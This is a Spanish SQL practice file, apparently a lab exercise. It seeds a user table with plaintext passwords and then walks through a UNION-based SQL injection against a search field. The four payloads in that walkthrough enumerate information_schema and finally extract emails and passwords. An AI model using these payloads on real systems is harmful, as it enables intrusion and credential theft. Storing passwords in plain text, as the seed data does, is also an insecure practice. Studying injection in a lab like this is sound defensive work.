-- ============================
-- Tabla Usuario
-- ============================
CREATE TABLE Usuario (
    idUsuario SMALLINT UNSIGNED NOT NULL AUTO_INCREMENT,
    nombre VARCHAR(150) NOT NULL,
    correo VARCHAR(150) NOT NULL UNIQUE,
    pw CHAR(60) NOT NULL,
    CONSTRAINT pk_idUsuario PRIMARY KEY (idUsuario)
);

INSERT INTO Usuario (nombre, correo, pw) VALUES
('Juan Pérez', 'juan.perez@email.com', 'juan123'),
('María García', 'maria.garcia@email.com', 'maria123'),
('Carlos López', 'carlos.lopez@email.com', 'carlos123'),
('Ana Martínez', 'ana.martinez@email.com', 'ana123'),
('Pedro Sánchez', 'pedro.sanchez@email.com', 'pedro123'),
('Laura Rodríguez', 'laura.rodriguez@email.com', 'laura123'),
('David Fernández', 'david.fernandez@email.com', 'david123'),
('Carmen Díaz', 'carmen.diaz@email.com', 'carmen123'),
('Miguel Torres', 'miguel.torres@email.com', 'miguel123'),
('Isabel Ruiz', 'isabel123', 'isabel123'),
('Antonio Gómez', 'antonio.gomez@email.com', 'antonio123'),
('Rosa Hernández', 'rosa.hernandez@email.com', 'rosa123'),
('Francisco Moreno', 'francisco.moreno@email.com', 'francisco123'),
('Elena Jiménez', 'elena.jimenez@email.com', 'elena123'),
('José Álvarez', 'jose.alvarez@email.com', 'jose123'),
('Lucía Romero', 'lucia.romero@email.com', 'lucia123'),
('Manuel Navarro', 'manuel.navarro@email.com', 'manuel123'),
('Sofía Serrano', 'sofia.serrano@email.com', 'sofia123'),
('Javier Gil', 'javier.gil@email.com', 'javier123'),
('Paula Castro', 'paula.castro@email.com', 'paula123');


-- ====================
-- INFORMATION_SCHEMA
-- ====================

--Tablas que existen en la bbdd que cree
SELECT TABLE_NAME
FROM information_schema.tables
WHERE table_schema = 'pruebas';

--Muestra la estructura de Usuarios

SELECT COLUMN_NAME,DATA_TYPE,IS_NULLABLE, COLUMN_KEY
FROM information_schema.columns
WHERE table_schema = 'pruebas'
AND table_name = 'Usuario';


--Comprueba la existencia de una tabla
SELECT COUNT(*) AS existe
FROM information_schema.tables
WHERE table_schema = 'pruebas'
AND table_name = 'Usuario';


-- Vemos cuanto ocupa cada campo
SELECT COLUMN_NAME,DATA_TYPE, CHARACTER_MAXIMUM_LENGTH
FROM information_schema.columns
WHERE table_schema = 'pruebas'
AND table_name = 'Usuario';


-- ======================
-- Obtencion de datos
-- ======================

--CONSULTA 1. Con esto paramos la consulta que estaba haciendo antes y la unes a otra que selecciona todo los campos de la tabla de una tabla ficticia y para lo siguiente que haya co el comentario

asdasd' union select null,null,null,null, 'hola' from dual #

SELECT Consejos.*, Tematica.tematica AS nombreTematica 
                FROM Consejos 
                LEFT JOIN Tematica ON Consejos.idTematica = Tematica.idTematica 
                WHERE Consejos.consejo LIKE '%asdasd' union select null,null,null,null, 'hola' from dual #%'


--CONSULTA 2.Con esta consulta sacamos informacion con el schema, y si bajamos encontramos los nombres de las columnas

Asdasd' union select null,null,null,table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS #

SELECT Consejos.*, Tematica.tematica AS nombreTematica 
                FROM Consejos 
                LEFT JOIN Tematica ON Consejos.idTematica = Tematica.idTematica 
                WHERE Consejos.consejo LIKE '%asdasd' union select null,null,null,table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS #%'


--CONSULTA 3. Aquí con esta consulta concatenamos el nombre de la base de datos con el nombre de la tabla y sus campos, esto nos sirve para ya hacer el select de columnas en especifico

asdsadad' union select concat_ws('.', table_schema, table_name) as tabla, column_name, NULL, NULL,NULL from INFORMATION_SCHEMA.COLUMNS #

SELECT Consejos.*, Tematica.tematica AS nombreTematica 
                FROM Consejos 
                LEFT JOIN Tematica ON Consejos.idTematica = Tematica.idTematica 
                WHERE Consejos.consejo LIKE '%asdsadad' union select concat_ws('.', table_schema, table_name) as tabla, column_name, NULL, NULL,NULL from INFORMATION_SCHEMA.COLUMNS #%'


--CONSULTA 4. Ya sabiendo las columnas y tablas podemos hacer un select normal de la base de datos y esperar a ver que nos devuelve.

asdasdsad' union select correo, pw,null,null,null from pruebas.usuario #

SELECT Consejos.*, Tematica.tematica AS nombreTematica 
                FROM Consejos 
                LEFT JOIN Tematica ON Consejos.idTematica = Tematica.idTematica 
                WHERE Consejos.consejo LIKE '%asdasdsad' union select correo, pw,null,null,null from pruebas.usuario #%'
Buscar Consejo